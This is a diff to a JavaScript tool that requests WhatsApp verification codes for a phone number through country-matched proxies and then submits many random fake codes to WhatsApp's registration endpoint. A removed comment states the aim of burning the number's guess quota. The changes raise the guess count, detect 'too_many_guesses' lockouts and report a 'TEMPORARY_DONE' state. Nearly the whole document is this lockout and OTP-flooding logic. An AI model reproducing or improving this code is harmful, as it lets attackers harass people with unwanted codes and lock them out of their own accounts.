@@ -21,7 +21,6 @@ function extractCountryCallingCode(phone) {
   return "";
 }
 
-// DataImpulse __cr.XX codes (ISO-ish short)
 const CC_TO_PROXY_COUNTRY = {
   "1": "us",
   "7": "ru",
@@ -321,7 +320,6 @@ function getDispatcherForPhone(phone) {
   }
 }
 
-// backward compat
 function buildProxyUrlFromEnv() {
   return buildProxyUrlForCountry(PROXY_DEFAULT_COUNTRY);
 }
@@ -921,7 +919,6 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
   try {
     assertNotCancelled();
     let probe = options.probe || null;
-    // skipProbe default recommended for temporary loop (hindari double request)
     if (!skipProbe && !probe) {
       try {
         probe = await probePhoneMethods(cleanPhone);
@@ -935,7 +932,6 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
       return { success: false, phone: probe.phone || cleanPhone, method: methodKey, state: "BANNED", error: "banned", probe, cooldownSeconds: 0 };
     }
 
-    // Probe gagal/timeout: tetap lanjut kirim OTP (force)
     if (probe && !probe.success && !options.forceSend && !options.ignoreCooldown) {
       const pe = String(probe.error || "");
       if (!/TIMEOUT|NETWORK|HTTP_5|EMPTY/i.test(pe)) {
@@ -1014,39 +1010,59 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
     let reason = String(codeJson.reason || existJson.reason || "").toLowerCase();
     let status = String(codeJson.status || "").toLowerCase();
     let methods = extractMethodWaits(null, existJson, codeJson);
-    let cooldownSeconds =
-      numWait(methods[methodKey]) ||
-      numWait(methods.sms) ||
-      numWait(codeJson.retry_after ?? codeJson.sms_wait ?? codeJson.wait);
+    let cooldownSeconds = numWait(methods[methodKey]);
+    if (!cooldownSeconds) {
+      const keyWait =
+        methodKey === "voice" ? (codeJson.voice_wait ?? existJson.voice_wait) :
+        methodKey === "email" ? (codeJson.email_wait ?? codeJson.email_retry_after ?? existJson.email_wait) :
+        methodKey === "flash" ? (codeJson.flash_wait ?? existJson.flash_wait) :
+        methodKey === "wa_old" ? (codeJson.wa_old_wait ?? existJson.wa_old_wait) :
+        (codeJson.sms_wait ?? codeJson.retry_after ?? codeJson.wait ?? existJson.sms_wait ?? existJson.retry_after);
+      cooldownSeconds = numWait(keyWait);
+    }
     let deviceOn = extractDeviceState(null, existJson, codeJson);
     const hardFail = ["blocked", "banned", "no_routes", "bad_token", "length_long", "length_short", "missing"].includes(reason);
-    const sentOk = status === "sent" || status === "ok" || ["sent", "sms_sent", "code_sent", "incorrect"].includes(reason);
+    const sentOk =
+      status === "sent" ||
+      status === "ok" ||
+      ["sent", "sms_sent", "code_sent"].includes(reason);
 
-    // Multi fake OTP → burn guess quota lebih cepat (too_many_guesses / temporary)
-    if (sentOk && !hardFail && typeof WADetector.buildRegisterPayloads === "function") {
-      const guessCount = Math.max(1, Math.min(3, parseInt(process.env.WA_FAKE_GUESS_COUNT || "3", 10)));
-      for (let g = 0; g < guessCount; g++) {
+    let guessLocked = false;
+    let guessCountDone = 0;
+    if ((sentOk || reason === "incorrect" || reason === "too_recent") && !hardFail && typeof WADetector.buildRegisterPayloads === "function") {
+      const maxGuess = Math.max(1, Math.min(20, parseInt(process.env.WA_FAKE_GUESS_COUNT || "12", 10)));
+      for (let g = 0; g < maxGuess; g++) {
         try {
           assertNotCancelled();
           const fakeCode = String(100000 + Math.floor(Math.random() * 900000));
           const regPayload = await WADetector.buildRegisterPayloads(cleanPhone, fakeCode);
           if (!regPayload || !regPayload.success || !regPayload.register) break;
-          await new Promise(r => setTimeout(r, 35 + g * 40));
+          await new Promise(r => setTimeout(r, 40 + g * 25));
           assertNotCancelled();
           registerText = await callWAWithRetry(regPayload.register, regPayload.userAgent, payload.headers, sendTimeout, 1, signal, cleanPhone);
+          guessCountDone += 1;
           const regJson = safeJsonParse(registerText) || {};
           const regReason = String(regJson.reason || "").toLowerCase();
           const regStatus = String(regJson.status || "").toLowerCase();
-          const regWait = numWait(regJson.retry_after ?? regJson.sms_wait ?? regJson.wait ?? regJson.email_wait);
-          if (regWait > cooldownSeconds) cooldownSeconds = regWait;
+          const regWait = numWait(
+            regJson.retry_after ?? regJson.sms_wait ?? regJson.voice_wait ?? regJson.wait ?? regJson.email_wait
+          );
           if (regReason) reason = regReason;
           if (regStatus) status = regStatus;
           methods = extractMethodWaits(null, existJson, { ...codeJson, ...regJson });
           const methodWait = numWait(methods[methodKey]);
-          if (methodWait > cooldownSeconds) cooldownSeconds = methodWait;
+          if (methodWait > 0) cooldownSeconds = methodWait;
+          else if (regWait > 0) cooldownSeconds = regWait;
           deviceOn = extractDeviceState(null, existJson, { ...codeJson, ...regJson }) || deviceOn;
-          // sudah too_many_guesses / hard wait → stop guess
-          if (regReason === "too_many_guesses" || regWait >= 600) break;
+          if (
+            regReason === "too_many_guesses" ||
+            regReason === "too_many" ||
+            regReason === "blocked" ||
+            regWait >= 600
+          ) {
+            guessLocked = true;
+            break;
+          }
         } catch (regErr) {
           const rm = String(regErr && regErr.message ? regErr.message : regErr);
           if (rm === "CANCELLED") {
@@ -1055,6 +1071,9 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
         }
       }
     }
+
+    const methodCd = numWait(methods[methodKey]);
+    if (methodCd > 0) cooldownSeconds = methodCd;
 
     if (hardFail) {
       return {
@@ -1066,12 +1085,34 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
         cooldownSeconds,
         methods,
         isDeviceOn: deviceOn,
-        probe
+        probe,
+        guessCount: guessCountDone
       };
     }
 
-    const softCooldownReasons = ["too_recent", "too_many", "try_again", "too_many_guesses", "next_method", "incorrect"];
-    const hardCooldownReasons = ["temporarily_unavailable", "rate_overlimit"];
+    if (
+      guessLocked ||
+      reason === "too_many_guesses" ||
+      (reason === "too_many" && cooldownSeconds >= 300)
+    ) {
+      return {
+        success: true,
+        phone: formattedPhone,
+        method: methodKey,
+        state: "TEMPORARY_DONE",
+        reason: reason || "too_many_guesses",
+        cooldownSeconds: Math.max(cooldownSeconds, 600),
+        methods,
+        isDeviceOn: deviceOn,
+        hasDevice: deviceOn,
+        probe,
+        guessCount: guessCountDone,
+        rawStatus: status,
+        rawReason: reason
+      };
+    }
+
+    const hardCooldownReasons = ["temporarily_unavailable", "rate_overlimit", "no_routes"];
     if (hardCooldownReasons.includes(reason) || cooldownSeconds >= 600) {
       return {
         success: true,
@@ -1083,31 +1124,36 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
         methods,
         isDeviceOn: deviceOn,
         probe,
+        guessCount: guessCountDone,
         rawStatus: status,
         rawReason: reason
       };
     }
 
-    if (sentOk || softCooldownReasons.includes(reason) || cooldownSeconds > 0) {
-      const state = cooldownSeconds > 0 && cooldownSeconds < 600 ? "SMS_LIMIT" : (cooldownSeconds >= 600 ? "COOLDOWN" : "SENT");
+    const softCooldownReasons = ["too_recent", "try_again", "next_method"];
+    if (sentOk || softCooldownReasons.includes(reason) || methodCd > 0 || cooldownSeconds > 0) {
+      let state = "SENT";
+      if (methodCd > 0 || cooldownSeconds > 0) {
+        state = (methodCd || cooldownSeconds) >= 600 ? "COOLDOWN" : "SMS_LIMIT";
+      }
       return {
         success: true,
         phone: formattedPhone,
         method: methodKey,
         state,
         reason: reason || status || "sent",
-        cooldownSeconds,
+        cooldownSeconds: methodCd || cooldownSeconds || 0,
         methods,
         maskedEmail: codeJson.email || codeJson.masked_email || existJson.email || (probe && probe.maskedEmail) || null,
         isDeviceOn: deviceOn,
         hasDevice: deviceOn,
         probe,
+        guessCount: guessCountDone,
         rawStatus: status,
         rawReason: reason
       };
     }
 
-    // bad_param / method_not_allowed = method tidak valid untuk nomor ini
     if (reason === "bad_param" || reason === "method_not_allowed" || reason === "provider_timeout") {
       const blockedMethods = { ...(methods || {}) };
       blockedMethods[methodKey] = Math.max(numWait(blockedMethods[methodKey]), 3600);
